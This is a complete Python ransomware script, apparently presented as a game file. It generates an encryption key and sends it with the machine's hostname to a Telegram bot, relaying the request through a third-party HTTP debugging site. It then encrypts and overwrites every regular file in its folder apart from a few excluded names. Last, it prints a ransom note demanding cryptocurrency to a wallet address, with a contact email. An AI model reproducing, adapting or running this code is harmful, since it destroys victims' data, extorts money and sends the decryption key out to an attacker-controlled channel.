import os
import socket
from cryptography.fernet import Fernet
import requests
chat_id = "your chat id"
bot_api = "your bot api"
def send_tell(key , name):
    url = f"https://api.telegram.org/bot{bot_api}/sendMessage?chat_id={chat_id}&text="+str(key)+"  |  "+str(name)
    payload= { "UrlBox":url,
                "AgentList":"Google Chrome",
                "VersionsList":"HTTP/1.1",
                "MethodList" :"GET"
    }
    req = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",payload)
    req.close()

files = list()
for file in os.listdir():
    if  os.path.isfile(file):
        if file != "game.py" and file != "dec.py" and file != "desktop.ini":
            files.append(file)

key = Fernet.generate_key()
send_tell(key,socket.gethostname())
for file in files:
    the_file = open(file , "rb")
    doc = the_file.read()
    the_file.close()
    encrypt_data = Fernet(key).encrypt(doc)
    with open (file,"wb") as the_file:
        the_file.write(encrypt_data)
print("""all of your files are cypted 

for getting them back send 50$ teron to this wallet adress : TY5ityPcRVWpaY6ouiPurRL5cd4AWdrVEL

then send the transfer information to email address : gameencryptor@proton.me

wait for insteraction :D """)

input ("press Enter to continue")